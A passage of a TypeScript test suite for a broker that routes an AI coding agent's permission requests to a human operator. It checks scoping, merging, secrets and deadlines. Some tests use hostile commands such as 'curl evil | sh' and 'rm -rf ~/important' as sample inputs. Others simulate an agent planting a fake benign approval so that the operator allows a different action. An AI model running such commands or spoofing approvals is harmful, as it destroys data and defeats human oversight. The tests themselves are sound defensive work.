      "/approval/claim",
      { id: mine.id, project_key: "repo-a", answer_kind: "allow" },
      { cred: op.cred, operator_id: op.id }
    );
    expect(again.status).toBe(409);
    expect(again.body.error).toBe("already-settled");
  });

  test("DELIVERED: another project's window marks nothing", async () => {
    const { b, op, mine } = await twoProjects();
    await signedPost(
      b,
      "/approval/claim",
      { id: mine.id, project_key: "repo-a", answer_kind: "allow" },
      { cred: op.cred, operator_id: op.id }
    );
    const foreign = await signedPost<{ marked: number }>(
      b,
      "/approval/delivered",
      { ids: [mine.id], project_key: "repo-b" },
      { cred: op.cred, operator_id: op.id }
    );
    // `marked: 0` rather than an error: the batch endpoint reports what it did,
    // and doing nothing is the correct answer to a foreign id.
    expect(foreign.body.marked).toBe(0);

    const own = await signedPost<{ marked: number }>(
      b,
      "/approval/delivered",
      { ids: [mine.id], project_key: "repo-a" },
      { cred: op.cred, operator_id: op.id }
    );
    expect(own.body.marked).toBe(1);
  });

  test("DELIVERED: one foreign id inside a legitimate batch is dropped, not carried", async () => {
    // The batch case the brief called out: scoping only the first id would let
    // a caller smuggle another project's approval into an otherwise valid call.
    const b = await boot();
    const op = newOperator();
    const a = await addApproval(b, op, { project_key: "repo-a" });
    const foreign = await addApproval(b, op, { project_key: "repo-b" });
    for (const [id, pk] of [
      [a.id, "repo-a"],
      [foreign.id, "repo-b"],
    ] as const) {
      await signedPost(
        b,
        "/approval/claim",
        { id, project_key: pk, answer_kind: "allow" },
        { cred: op.cred, operator_id: op.id }
      );
    }
    const mixed = await signedPost<{ marked: number }>(
      b,
      "/approval/delivered",
      { ids: [a.id, foreign.id], project_key: "repo-a" },
      { cred: op.cred, operator_id: op.id }
    );
    expect(mixed.body.marked).toBe(1);
  });

  test("CLAIM settles exactly ONE approval, not every sibling in the same scope", async () => {
    // Review probe S4, and the reason it exists: dropping `id = ?` from
    // settleApproval's UPDATE while KEEPING the scope clause left broker 33/33,
    // reply 8/8 and the discipline scan 4/4 green. One claim would then have
    // answered every pending approval of the same operator AND project at once
    // -- an agent receiving an "allow" it never asked for, which is worse than
    // any leak of visibility.
    //
    // Measured before writing this: 19 calls to /approval/claim in this suite,
    // and not one of them raised TWO approvals to check the second survives.
    // The scope tests above cannot see it either, since they differ by project
    // and this defect strikes WITHIN one.
    const b = await boot();
    const op = newOperator();
    const first = await addApproval(b, op, { project_key: "repo-a", title: "first" });
    const second = await addApproval(b, op, { project_key: "repo-a", title: "second" });
    expect(second.id).not.toBe(first.id);

    const claimed = await signedPost<{ approval: Approval }>(
      b,
      "/approval/claim",
      { id: first.id, project_key: "repo-a", answer_kind: "allow" },
      { cred: op.cred, operator_id: op.id }
    );
    expect(claimed.status).toBe(200);
    expect(claimed.body.approval.id).toBe(first.id);

    // THE assertion. Read through /approval/list rather than trusting the claim
    // response: what matters is the state of the OTHER row in the database.
    const listed = await signedPost<{ approvals: Approval[] }>(
      b,
      "/approval/list",
      approvalListBody("repo-a"),
      { cred: op.cred, operator_id: op.id }
    );
    const survivor = listed.body.approvals.find((a) => a.id === second.id);
    expect(survivor?.status).toBe("pending");
    expect(survivor?.answer_kind).toBeNull();
  });

  test("ADD: the de-duplication key is per project, not per operator", async () => {
    // `tile_ref` is a window-local handle, so two Deck windows can legitimately
    // use the same one. Scoped on operator_id alone, the second window's raise
    // would have RETURNED THE FIRST WINDOW'S APPROVAL as its own -- a
    // cross-project answer delivered to the wrong agent, which is worse than a
    // leak of visibility.
    const b = await boot();
    const op = newOperator();
    const a = await addApproval(b, op, { project_key: "repo-a", session_ref: "tile-1", tile_ref: "tile-1" });
    // A question: a permission never merges, so it would pass unscoped too.
    const c = await addApproval(b, op, { kind: "question", project_key: "repo-b", session_ref: "tile-1", tile_ref: "tile-1" });
    expect(c.id).not.toBe(a.id);
    // ...and a permission raised in repo-b does not close repo-a's.
    await addApproval(b, op, { project_key: "repo-b", session_ref: "tile-1", tile_ref: "tile-1" });
    const listedA = await signedPost<{ approvals: Approval[] }>(b, "/approval/list", approvalListBody("repo-a"), {
      cred: op.cred,
      operator_id: op.id,
    });
    expect(listedA.body.approvals.find((x) => x.id === a.id)?.status).toBe("pending");

    // Negative control: within ONE project the de-duplication must still fire,
    // or this test would pass on a broker that had simply lost the feature.
    // A question, because a permission never merges: it joins the permission.
    const again = await addApproval(b, op, { kind: "question", project_key: "repo-a", session_ref: "tile-1", tile_ref: "tile-1" });
    expect(again.id).toBe(a.id);
  });
});

describe("merge species (chantier 3189b002+874e9053)", () => {
  async function mintSession(
    b: TestBroker,
    op: { cred: ApprovalCredential; id: string },
    sessionRef: string
  ): Promise<{ cred: ApprovalCredential; token_id: string }> {
    const cred = generateCredential();
    const res = await signedPost<{ token_id: string }>(
      b,
      "/approval/token-mint",
      { session_public_key: cred.publicKey, session_ref: sessionRef },
      { cred: op.cred, operator_id: op.id }
    );
    expect(res.status).toBe(200);
    return { cred, token_id: res.body.token_id };
  }

  test("the same event merges in BOTH arrival orders (closes 874e9053's asymmetry)", async () => {
    const b = await boot();
    const op = newOperator();

    // hook-then-deck: already merged pre-fix (874e9053's own measurement).
    const tileA = "tile-order-hook-first";
    const sessionA = await mintSession(b, op, tileA);
    const hookFirst = await signedPost<{ approval: { id: string } }>(
      b,
      "/approval/add",
      { kind: "question", title: "hook title", question: "hook question", session_ref: tileA, tile_ref: tileA },
      { cred: sessionA.cred, operator_id: op.id, kind: "session", token_id: sessionA.token_id }
    );
    expect(hookFirst.status).toBe(200);
    const deckSecond = await addApproval(b, op, {
      kind: "question",
      title: "deck title",
      question: "deck question",
      tile_ref: tileA,
    });
    expect(deckSecond.id).toBe(hookFirst.body.approval.id);

    // deck-then-hook: the order 874e9053 measured as NOT merging pre-fix,
    // because the hook's session-pinned SELECT never matched a row the Deck
    // (an operator credential) wrote with session_ref=''.
    const tileB = "tile-order-deck-first";
    const sessionB = await mintSession(b, op, tileB);
    const deckFirst = await addApproval(b, op, { title: "deck title", question: "deck question", tile_ref: tileB });
    const hookSecond = await signedPost<{ approval: { id: string } }>(
      b,
      "/approval/add",
      { kind: "question", title: "hook title", question: "hook question", session_ref: tileB, tile_ref: tileB },
      { cred: sessionB.cred, operator_id: op.id, kind: "session", token_id: sessionB.token_id }
    );
    expect(hookSecond.status).toBe(200);
    expect(hookSecond.body.approval.id).toBe(deckFirst.id);
    // Piece 4's guarantee on the real wire, not just the declared type: the
    // merged branch returns ONLY id + status, never another producer's
    // title/question.
    expect(Object.keys(hookSecond.body.approval)).toEqual(["id", "status"]);
  });

  test("a session credential merged onto an operator-authored row cannot wait on it (MAJOR 3, known limitation)", async () => {
    // Only a FIRE-AND-FORGET producer may raise merge:'tile' with a session
    // credential: the hook never reads its response (no /approval/wait call
    // anywhere in desktop/hooks/approval-hook.ts) and ask_operator raises
    // merge:'never' without a tile_ref, so it never merges. A session
    // producer that DID try to wait on a row it merged onto would 404,
    // because /approval/wait stays pinned to its own session_ref (piece 4
    // must not widen it, or the id-only narrowing it just closed reopens).
    const b = await boot();
    const op = newOperator();
    const tileRef = "tile-major3";

    const deckFirst = await addApproval(b, op, { tile_ref: tileRef });
    const session = await mintSession(b, op, tileRef);
    const sessionSecond = await signedPost<{ approval: { id: string } }>(
      b,
      "/approval/add",
      { kind: "question", title: "hook title", question: "hook question", session_ref: tileRef, tile_ref: tileRef },
      { cred: session.cred, operator_id: op.id, kind: "session", token_id: session.token_id }
    );
    expect(sessionSecond.status).toBe(200);
    // Confirms the merge actually happened (piece 3's fix): without it, this
    // would be a fresh row and the wait below would trivially succeed.
    expect(sessionSecond.body.approval.id).toBe(deckFirst.id);

    const waited = await signedPost<{ error: string }>(
      b,
      "/approval/wait",
      { id: deckFirst.id, timeout_sec: 1 },
      { cred: session.cred, operator_id: op.id, kind: "session", token_id: session.token_id }
    );
    expect(
      waited.status,
      "a session credential that merged onto an operator-authored row must 404 on /approval/wait -- " +
        "only a fire-and-forget producer (the hook) may raise merge:'tile' with a session credential"
    ).toBe(404);
  });

  test("a notification and a guarded request on the SAME tile get separate rows", async () => {
    const b = await boot();
    const op = newOperator();
    const tileRef = "tile-species";

    // A GUARDED request first (merge:'never'), as 02e1c07c will raise one
    // carrying a real tile_ref for Courrier attribution.
    const guarded = await addApproval(b, op, {
      title: "Guarded question",
      question: "may I proceed?",
      tile_ref: tileRef,
      merge: "never",
    });
    // A NOTIFICATION second, same tile, default merge ('tile').
    const notif = await addApproval(b, op, {
      title: "Screen notice",
      question: "session X waits",
      tile_ref: tileRef,
    });

    expect(notif.id).not.toBe(guarded.id);
    const list = await signedPost<{ approvals: Approval[] }>(
      b,
      "/approval/list",
      approvalListBody(DEFAULT_PROJECT_KEY),
      { cred: op.cred, operator_id: op.id }
    );
    expect(list.body.approvals.filter((a) => a.origin.tile_ref === tileRef)).toHaveLength(2);
  });

  test("a row predating this migration (mergeable defaults to 1) still merges", async () => {
    const b = await boot();
    const op = newOperator();
    const tileRef = "tile-legacy";

    // Simulate a row inserted before `mergeable` existed: every NOT-NULL
    // column this INSERT needs EXCEPT mergeable, relying on the column's own
    // DEFAULT 1 rather than setting it explicitly.
    const db = new Database(b.dbPath);
    const legacyId = "legacy-row-id";
    const now = new Date().toISOString();
    db.run(
      `INSERT INTO pending_approvals
         (id, operator_id, project_key, tile_ref, kind, title, question, status, created_at, notif_expires_at)
       VALUES (?, ?, ?, ?, 'question', 'legacy title', 'legacy question', 'pending', ?, ?)`,
      [legacyId, op.id, DEFAULT_PROJECT_KEY, tileRef, now, now]
    );
    db.close();

    const second = await addApproval(b, op, { kind: "question", tile_ref: tileRef });
    expect(second.id).toBe(legacyId);
  });
});

describe("a permission raise never inherits another dialog's row", () => {
  // One credential per Deck window, as approval-runtime mints it: its
  // session_ref is the window's, and tile_ref is the caller's own claim.
  async function windowSession(b: TestBroker, op: { cred: ApprovalCredential; id: string }, windowRef: string) {
    const cred = generateCredential();
    const res = await signedPost<{ token_id: string }>(
      b,
      "/approval/token-mint",
      { session_public_key: cred.publicKey, session_ref: windowRef },
      { cred: op.cred, operator_id: op.id }
    );
    expect(res.status).toBe(200);
    const signer = { cred, operator_id: op.id, kind: "session" as const, token_id: res.body.token_id };
    const cfg = {
      brokerUrl: b.url, brokerToken: null, operatorId: op.id, tokenId: res.body.token_id, sessionRef: windowRef,
      privateKey: cred.privateKey, publicKey: cred.publicKey, osUserHash: "", blockSec: 900,
      origin: { project_key: DEFAULT_PROJECT_KEY },
    };
    /** What the PermissionRequest hook posts for this tool call on `tile`. */
    const hookRaise = (tile: string, tool: string, input: Record<string, unknown>) =>
      signedPost<{ approval: Approval }>(
        b,
        "/approval/add",
        buildApprovalRequest({ hook_event_name: "PermissionRequest", tool_name: tool, tool_input: input }, cfg, tile),
        signer
      );
    /** A permission the agent signs itself with the credential it can read. */
    const plant = (tile: string, title: string) =>
      signedPost<{ approval: Approval }>(
        b,
        "/approval/add",
        { kind: "permission", title, question: "The agent wants to use Read.", options: ["Allow", "Deny"],
          session_ref: windowRef, tile_ref: tile, origin: { project_key: DEFAULT_PROJECT_KEY } },
        signer
      );
    return { hookRaise, plant };
  }

  async function onTile(b: TestBroker, op: { cred: ApprovalCredential; id: string }, tile: string): Promise<Approval[]> {
    const res = await signedPost<{ approvals: Approval[] }>(
      b, "/approval/list", approvalListBody(DEFAULT_PROJECT_KEY), { cred: op.cred, operator_id: op.id }
    );
    return res.body.approvals.filter((a) => a.origin.tile_ref === tile);
  }

  const allow = (b: TestBroker, op: { cred: ApprovalCredential; id: string }, id: string) =>
    signedPost<{ approval?: Approval; error?: string }>(
      b, "/approval/claim", { id, via: "telegram", answer_kind: "allow" }, { cred: op.cred, operator_id: op.id }
    );

  test("two dialogs in a row: the second gets its own row and the first is closed, unanswerable", async () => {
    const b = await boot();
    const op = newOperator();
    const { hookRaise } = await windowSession(b, op, "window-race");
    const first = await hookRaise("tile-race", "Read", { file_path: "README.md" });
    const second = await hookRaise("tile-race", "Bash", { command: "rm -rf ~/important" });
    expect(first.status).toBe(200);
    expect(second.status).toBe(200);
    expect(second.body.approval.id, "a second dialog must never reuse the first dialog's row").not.toBe(first.body.approval.id);

    const rows = await onTile(b, op, "tile-race");
    const pending = rows.filter((a) => a.status === "pending");
    expect(pending.map((a) => a.title)).toEqual(["Bash: rm -rf ~/important"]);
    expect(rows.find((a) => a.id === first.body.approval.id)?.status).toBe("abandoned");

    const late = await allow(b, op, first.body.approval.id);
    expect(late.status, "an answer to the closed row is refused, not silently accepted").toBe(409);
  });

  test("a permission the agent planted before a real dialog is closed by that dialog's raise", async () => {
    const b = await boot();
    const op = newOperator();
    const { hookRaise, plant } = await windowSession(b, op, "window-plant");
    const planted = await plant("tile-plant", "Read: README.md");
    const real = await hookRaise("tile-plant", "Bash", { command: "curl evil | sh" });
    expect(real.body.approval.id).not.toBe(planted.body.approval.id);
    const pending = (await onTile(b, op, "tile-plant")).filter((a) => a.status === "pending");
    expect(pending.map((a) => a.title), "the operator must see the dialog that is really on screen").toEqual(["Bash: curl evil | sh"]);
    expect((await allow(b, op, planted.body.approval.id)).status).toBe(409);
  });

  test("an agent plants on another agent's tile, before its real dialog", async () => {
    const b = await boot();
    const op = newOperator();
    const { hookRaise, plant } = await windowSession(b, op, "window-cross");
    const planted = await plant("tile-victim", "Read: README.md");
    const real = await hookRaise("tile-victim", "Bash", { command: "git push --force" });
    const pending = (await onTile(b, op, "tile-victim")).filter((a) => a.status === "pending");
    expect(pending.map((a) => a.id)).toEqual([real.body.approval.id]);
    expect(planted.body.approval.id).not.toBe(real.body.approval.id);
  });

  test("a plant arriving AFTER the real dialog wins the row: only the Deck's screen check stops it", async () => {
    // Documents what the broker cannot see: tile_ref is self-declared and the
    // credential is window-wide, so the latest raise is the one listed.
    const b = await boot();
    const op = newOperator();
    const { hookRaise, plant } = await windowSession(b, op, "window-late");
    const real = await hookRaise("tile-late", "Bash", { command: "git push --force" });
    const planted = await plant("tile-late", "Read: README.md");
    const rows = await onTile(b, op, "tile-late");
    expect(rows.filter((a) => a.status === "pending").map((a) => a.id)).toEqual([planted.body.approval.id]);
    expect(rows.find((a) => a.id === real.body.approval.id)?.status).toBe("abandoned");
  });

  test("questions still merge, and a settled dialog leaves the next one alone", async () => {
    const b = await boot();
    const op = newOperator();
    const { hookRaise } = await windowSession(b, op, "window-control");
    const perm = await hookRaise("tile-control", "Bash", { command: "ls" });
    const question = await addApproval(b, op, { kind: "question", title: "q", question: "q?", tile_ref: "tile-control" });
    expect(question.id, "a question on a tile still joins its pending permission").toBe(perm.body.approval.id);

    const done = await signedPost(b, "/approval/claim", { id: perm.body.approval.id, via: "deck", answer_kind: "allow" },
      { cred: op.cred, operator_id: op.id });
    expect(done.status).toBe(200);
    const next = await hookRaise("tile-control", "Bash", { command: "pwd" });
    const rows = await onTile(b, op, "tile-control");
    expect(rows.find((a) => a.id === perm.body.approval.id)?.status, "an answered row is never rewritten").toBe("answered");
    expect(rows.find((a) => a.id === next.body.approval.id)?.status).toBe("pending");
  });

  test("at the pending cap, the next dialog on a tile still gets its row: the one it closes does not count", async () => {
    const b = await boot({ CLAUDE_PEERS_APPROVAL_MAX_PENDING: "1" });
    const op = newOperator();
    const { hookRaise } = await windowSession(b, op, "window-cap");
    expect((await hookRaise("tile-cap", "Bash", { command: "ls" })).status).toBe(200);
    const next = await hookRaise("tile-cap", "Bash", { command: "pwd" });
    expect(next.status, "a full cap must not refuse the dialog that replaces the tile's own").toBe(200);
    expect((await hookRaise("tile-other", "Bash", { command: "ls" })).status, "the cap still binds another tile").toBe(429);
  });

  test("a permission whose notification expired is closed by the next dialog's raise too", async () => {
    const b = await boot();
    const op = newOperator();
    const { hookRaise } = await windowSession(b, op, "window-expired");
    const first = await hookRaise("tile-expired", "Bash", { command: "ls" });
    const db = new Database(b.dbPath);
    db.run(`UPDATE pending_approvals SET status = 'expired_notif' WHERE id = ?`, [first.body.approval.id]);
    db.close();
    await hookRaise("tile-expired", "Bash", { command: "pwd" });
    const rows = await onTile(b, op, "tile-expired");
    expect(rows.find((a) => a.id === first.body.approval.id)?.status, "the Deck could still have settled it").toBe("abandoned");
  });

  test("a permission the Deck raised with the OPERATOR credential is closed by the hook's raise on that tile", async () => {
    // The two producers sign with different credentials: the closing UPDATE
    // must use the tile-wide scope, not the caller's session-pinned one.
    const b = await boot();
    const op = newOperator();
    const { hookRaise } = await windowSession(b, op, "window-mixed");
    const deck = await addApproval(b, op, { kind: "permission", title: "Bash: ls", tile_ref: "tile-mixed" });
    await hookRaise("tile-mixed", "Bash", { command: "pwd" });
    const rows = await onTile(b, op, "tile-mixed");
    expect(rows.find((a) => a.id === deck.id)?.status).toBe("abandoned");
  });

  test("a guarded request on the tile is never closed by a permission raise", async () => {
    const b = await boot();
    const op = newOperator();
    const { hookRaise } = await windowSession(b, op, "window-guarded");
    const guarded = await addApproval(b, op, { kind: "permission", merge: "never", tile_ref: "tile-guarded" });
    await hookRaise("tile-guarded", "Bash", { command: "ls" });
    const rows = await onTile(b, op, "tile-guarded");
    expect(rows.find((a) => a.id === guarded.id)?.status).toBe("pending");
  });
});

describe("the hook route: a verdict the Claude Code module returns itself", () => {
  type Op = { cred: ApprovalCredential; id: string };
  type Signer = { cred: ApprovalCredential; operator_id: string; kind: "session"; token_id: string };

  async function session(b: TestBroker, op: Op, sessionRef: string): Promise<Signer> {
    const cred = generateCredential();
    const res = await signedPost<{ token_id: string }>(
      b,
      "/approval/token-mint",
      { session_public_key: cred.publicKey, session_ref: sessionRef },
      { cred: op.cred, operator_id: op.id }
    );
    expect(res.status).toBe(200);
    return { cred, operator_id: op.id, kind: "session", token_id: res.body.token_id };
  }

  /** An `undefined` override drops the key, so it is absent from the signed body. */
  const raise = (b: TestBroker, signer: Signer, sessionRef: string, over: Record<string, unknown> = {}) => {
    const body: Record<string, unknown> = {
      kind: "permission",
      title: "Bash",
      question: "Allow `ls`?",
      options: ["Allow", "Deny"],
      session_ref: sessionRef,
      tile_ref: "tile-hook",
      reply_route: "hook",
      merge: "never",
      ...over,
    };
    for (const k of Object.keys(body)) if (body[k] === undefined) delete body[k];
    return signedPost<{ approval: Approval; producer_secret?: string; error?: string }>(b, "/approval/add", body, signer);
  };

  /** A default hook row, with the producer secret only its add returns. */
  async function hook(b: TestBroker, signer: Signer): Promise<Approval & { secret: string }> {
    const res = await raise(b, signer, "window-hook");
    expect(res.status, res.body.error).toBe(200);
    expect(typeof res.body.producer_secret).toBe("string");
    return { ...res.body.approval, secret: res.body.producer_secret ?? "" };
  }

  /** `secret` undefined leaves producer_secret out of the signed body. */
  const withSecret = (body: Record<string, unknown>, secret: string | undefined) =>
    secret === undefined ? body : { ...body, producer_secret: secret };

  const wait = (b: TestBroker, signer: Signer, id: string, timeout_sec: number, secret?: string) =>
    signedPost<{ approval?: Approval; pending?: boolean; error?: string }>(
      b, "/approval/wait", withSecret({ id, timeout_sec }, secret), signer
    );

  const withdraw = (b: TestBroker, signer: Signer, id: string, secret?: string) =>
    signedPost<{ approval?: Approval; error?: string }>(b, "/approval/withdraw", withSecret({ id }, secret), signer);

  const claimAllow = (b: TestBroker, op: Op, id: string) =>
    signedPost<{ approval?: Approval; error?: string }>(
      b, "/approval/claim", { id, via: "deck", answer_kind: "allow" }, { cred: op.cred, operator_id: op.id }
    );

  async function listed(b: TestBroker, op: Op, id: string): Promise<Approval | undefined> {
    const res = await signedPost<{ approvals: Approval[] }>(
      b, "/approval/list", approvalListBody(DEFAULT_PROJECT_KEY), { cred: op.cred, operator_id: op.id }
    );
    return res.body.approvals.find((a) => a.id === id);
  }

  /** Pushes the row's liveness stamps back in time, as if the module stopped waiting. */
  function age(b: TestBroker, id: string, ms: number): void {
    const db = new Database(b.dbPath);
    const past = new Date(Date.now() - ms).toISOString();
    db.run("UPDATE pending_approvals SET last_wait_at = ?, created_at = ? WHERE id = ?", [past, past, id]);
    db.close();
  }

  test("a hook route is accepted only on a guarded request, and is read back as hook", async () => {
    const b = await boot();
    const op = newOperator();
    const s = await session(b, op, "window-hook");

    const merged = await raise(b, s, "window-hook", { merge: "tile" });
    expect(merged.status, "a mergeable row could be settled by another producer's verdict").toBe(400);
    const absent = await raise(b, s, "window-hook", { merge: undefined });
    expect(absent.status, "an absent merge normalises to tile").toBe(400);

    const ok = await raise(b, s, "window-hook");
    expect(ok.status).toBe(200);
    expect(ok.body.approval.reply_route).toBe("hook");
    expect((await listed(b, op, ok.body.approval.id))?.reply_route).toBe("hook");
    expect((await claimAllow(b, op, ok.body.approval.id)).status).toBe(200);
    const after = await wait(b, s, ok.body.approval.id, 1, ok.body.producer_secret);
    expect([after.body.approval?.reply_route, after.body.approval?.answer_kind]).toEqual(["hook", "allow"]);
    // The Deck poller's own read: a 'pty' here would get the verdict typed in.
    const undelivered = await signedPost<{ approvals: Approval[] }>(
      b, "/approval/list", { ...approvalListBody(DEFAULT_PROJECT_KEY), undelivered_only: true },
      { cred: op.cred, operator_id: op.id }
    );
    expect(undelivered.body.approvals.find((a) => a.id === ok.body.approval.id)?.reply_route).toBe("hook");
  });

  test("an unknown stored route is read back as pty, never silently: the broker log names the row", async () => {
    const b = await boot();
    const op = newOperator();
    const s = await session(b, op, "window-hook");
    const row = await hook(b, s);
    const db = new Database(b.dbPath);
    db.run("UPDATE pending_approvals SET reply_route = 'carrier-pigeon' WHERE id = ?", [row.id]);
    db.close();

    expect((await listed(b, op, row.id))?.reply_route).toBe("pty");
    const logPath = join(b.tmpDir, "logs", "broker.log");
    const deadline = Date.now() + 2000;
    let traced = false;
    while (!traced && Date.now() < deadline) {
      traced = readFileSync(logPath, "utf8").includes(`approval ${row.id}: unknown reply_route 'carrier-pigeon'`);
      if (!traced) await Bun.sleep(50);
    }
    expect(traced).toBe(true);
  });

  test("withdraw closes the session's own guarded row with no verdict and wakes its waiter", async () => {
    const b = await boot();
    const op = newOperator();
    const s = await session(b, op, "window-hook");
    const row = await hook(b, s);

    const parked = wait(b, s, row.id, 20, row.secret);
    await Bun.sleep(100);
    const res = await withdraw(b, s, row.id, row.secret);
    expect(res.status, res.body.error).toBe(200);
    expect([res.body.approval?.status, res.body.approval?.answer_kind]).toEqual(["answered_terminal", null]);

    const woke = await parked;
    expect(woke.body.pending).toBeUndefined();
    expect(woke.body.approval?.status).toBe("answered_terminal");
    // Not 'answered': the Deck's undelivered list must never offer it.
    const undelivered = await signedPost<{ approvals: Approval[] }>(
      b, "/approval/list", { ...approvalListBody(DEFAULT_PROJECT_KEY), undelivered_only: true },
      { cred: op.cred, operator_id: op.id }
    );
    expect(undelivered.body.approvals.map((a) => a.id)).not.toContain(row.id);
  });

  test("withdraw refuses a mergeable row, another session's row, and a row already settled", async () => {
    const b = await boot();
    const op = newOperator();
    const s = await session(b, op, "window-hook");
    const other = await session(b, op, "window-other");

    const tileRow = (await raise(b, s, "window-hook", { reply_route: "pty", merge: "tile" })).body.approval;
    expect((await withdraw(b, s, tileRow.id)).status).toBe(422);
    expect((await listed(b, op, tileRow.id))?.status).toBe("pending");

    const mine = await hook(b, s);
    expect((await withdraw(b, other, mine.id)).status, "same operator, other session: indistinguishable from unknown").toBe(404);
    expect((await listed(b, op, mine.id))?.status).toBe("pending");

    expect((await withdraw(b, s, mine.id, mine.secret)).status).toBe(200);
    expect((await withdraw(b, s, mine.id, mine.secret)).status).toBe(409);
  });

  test("every wait stamps last_wait_at", async () => {
    const b = await boot();
    const op = newOperator();
    const s = await session(b, op, "window-hook");
    const row = await hook(b, s);
    const read = (): string | null => {
      const db = new Database(b.dbPath);
      const r = db.query("SELECT last_wait_at FROM pending_approvals WHERE id = ?").get(row.id) as {
        last_wait_at: string | null;
      };
      db.close();
      return r.last_wait_at;
    };
    expect(read()).toBeNull();
    const before = Date.now();
    await wait(b, s, row.id, 1, row.secret);
    const stamped = Date.parse(read() ?? "");
    expect(stamped).toBeGreaterThanOrEqual(before - 1000);
    expect(stamped).toBeLessThanOrEqual(Date.now());
  });

  test("a permission hook row reaches its absolute deadline despite a fresh wait stamp", async () => {
    const b = await boot();
    const op = newOperator();
    const s = await session(b, op, "window-hook");
    const row = await hook(b, s);
    const db = new Database(b.dbPath);
    db.run(
      "UPDATE pending_approvals SET created_at = ?, last_wait_at = ? WHERE id = ?",
      [new Date(Date.now() - 30 * 60_000 - 1).toISOString(), new Date().toISOString(), row.id]
    );
    db.close();

    const res = await claimAllow(b, op, row.id);

    expect(res.status, res.body.error).toBe(410);
    expect((await listed(b, op, row.id))?.status).toBe("abandoned");
  });

  test("the deadline wakes a parked permission waiter with an abandoned approval", async () => {
    const b = await boot();
    const op = newOperator();
    const s = await session(b, op, "window-hook");
    const row = await hook(b, s);
    const db = new Database(b.dbPath);
    db.run(
      "UPDATE pending_approvals SET created_at = ? WHERE id = ?",
      [new Date(Date.now() - 30 * 60_000 + 1_500).toISOString(), row.id]
    );
    db.close();

    const started = Date.now();
    const parked = wait(b, s, row.id, 20, row.secret);
    let stamped = false;
    while (!stamped && Date.now() - started < 1_000) {
      const check = new Database(b.dbPath);
      const found = check.query("SELECT last_wait_at FROM pending_approvals WHERE id = ?").get(row.id) as {
        last_wait_at: string | null;
      };
      check.close();
      stamped = found.last_wait_at !== null;
      if (!stamped) await Bun.sleep(25);
    }
    expect(stamped).toBe(true);

    const waited = await parked;
    expect(waited.body.approval?.status).toBe("abandoned");
    expect(Date.now() - started).toBeGreaterThanOrEqual(1_000);
    expect(Date.now() - started).toBeLessThan(5_000);
  }, 10_000);

  test("the absolute permission deadline does not close a hook question", async () => {
    const b = await boot();
    const op = newOperator();
    const s = await session(b, op, "window-hook");
    const created = await raise(b, s, "window-hook", { kind: "question", title: "Question", question: "Continue?", options: [] });
    expect(created.status).toBe(200);
    const db = new Database(b.dbPath);
    db.run(
      "UPDATE pending_approvals SET created_at = ?, last_wait_at = ? WHERE id = ?",
      [new Date(Date.now() - 30 * 60_000 - 1).toISOString(), new Date().toISOString(), created.body.approval.id]
    );
    db.close();

    expect((await claimAllow(b, op, created.body.approval.id)).status).toBe(200);
  });

  test("a claim 46 s after the module's last wait is refused, with a reason, and the row is closed", async () => {
    const b = await boot();
    const op = newOperator();
    const s = await session(b, op, "window-hook");
    const row = await hook(b, s);
    await wait(b, s, row.id, 1, row.secret);
    age(b, row.id, 46_000);

    const res = await claimAllow(b, op, row.id);
    expect(res.status, "an allow nobody is waiting for must not be recorded as settled").toBe(410);
    expect(res.body.error).toContain("no longer waiting");
    expect((await listed(b, op, row.id))?.status).toBe("abandoned");
    expect((await claimAllow(b, op, row.id)).status).toBe(409);
  });

  const handback = (b: TestBroker, signer: { cred: ApprovalCredential; operator_id: string; kind?: "operator" | "session"; token_id?: string }, id: string) =>
    signedPost<{ approval?: Approval; error?: string }>(b, "/approval/claim", { id, via: "deck", handback: true }, signer);

  test("handback closes a hook row with no verdict, and the parked wait reads it back", async () => {
    const b = await boot();
    const op = newOperator();
    const s = await session(b, op, "window-hook");
    const row = await hook(b, s);

    const parked = wait(b, s, row.id, 20, row.secret);
    await Bun.sleep(100);
    const res = await handback(b, { cred: op.cred, operator_id: op.id }, row.id);
    expect(res.status, res.body.error).toBe(200);
    const woke = (await parked).body.approval;
    expect([woke?.status, woke?.answer_kind, woke?.answer_text]).toEqual(["answered_terminal", null, null]);
    expect((await claimAllow(b, op, row.id)).status, "handed back means settled: no later allow").toBe(409);
  });

  test("handback is refused on a row that is not hook-route", async () => {
    const b = await boot();
    const op = newOperator();
    const ptyRow = await addApproval(b, op);
    expect(ptyRow.reply_route).toBe("pty");
    expect((await handback(b, { cred: op.cred, operator_id: op.id }, ptyRow.id)).status).toBe(422);
    expect((await listed(b, op, ptyRow.id))?.status).toBe("pending");
  });

  test("handback is a claim: a session credential gets 403", async () => {
    const b = await boot();
    const op = newOperator();
    const s = await session(b, op, "window-hook");
    const row = await hook(b, s);
    expect((await handback(b, s, row.id)).status).toBe(403);
    expect((await listed(b, op, row.id))?.status).toBe("pending");
  });

  test("another tile holding the same window credential cannot wait on or withdraw a hook row without its secret", async () => {
    const b = await boot();
    const op = newOperator();
    // One credential per window: tile B signs with exactly A's session credential.
    const s = await session(b, op, "window-hook");
    const row = await hook(b, s);
    const unknown = await wait(b, s, crypto.randomUUID(), 1);
    expect(unknown.status).toBe(404);

    for (const secret of [undefined, "", "not-the-secret", `${row.secret}x`]) {
      const w = await wait(b, s, row.id, 1, secret);
      expect([w.status, w.body], `wait with ${JSON.stringify(secret)} must read like an unknown id`).toEqual([
        unknown.status,
        unknown.body,
      ]);
      const wd = await withdraw(b, s, row.id, secret);
      expect([wd.status, wd.body]).toEqual([unknown.status, unknown.body]);
    }
    const db = new Database(b.dbPath);
    const stamp = db.query("SELECT last_wait_at FROM pending_approvals WHERE id = ?").get(row.id) as {
      last_wait_at: string | null;
    };
    db.close();
    expect(stamp.last_wait_at, "an unauthenticated wait must not keep the row alive").toBeNull();
    expect((await listed(b, op, row.id))?.status).toBe("pending");

    expect((await wait(b, s, row.id, 1, row.secret)).body.pending).toBe(true);
    const opWait = await signedPost<{ pending?: boolean }>(
      b, "/approval/wait", { id: row.id, timeout_sec: 1 }, { cred: op.cred, operator_id: op.id }
    );
    expect(opWait.body.pending, "the operator credential needs no producer secret").toBe(true);
    expect((await withdraw(b, s, row.id, row.secret)).status).toBe(200);
  });

  test("the producer secret appears only in the add response: not in list, wait, nor the broker log", async () => {
    const b = await boot();
    const op = newOperator();
    const s = await session(b, op, "window-hook");
    const row = await hook(b, s);
    expect(row.secret.length).toBeGreaterThanOrEqual(22);

    const list = await signedPost(b, "/approval/list", approvalListBody(DEFAULT_PROJECT_KEY), {
      cred: op.cred,
      operator_id: op.id,
    });
    await claimAllow(b, op, row.id);
    const waited = await wait(b, s, row.id, 1, row.secret);
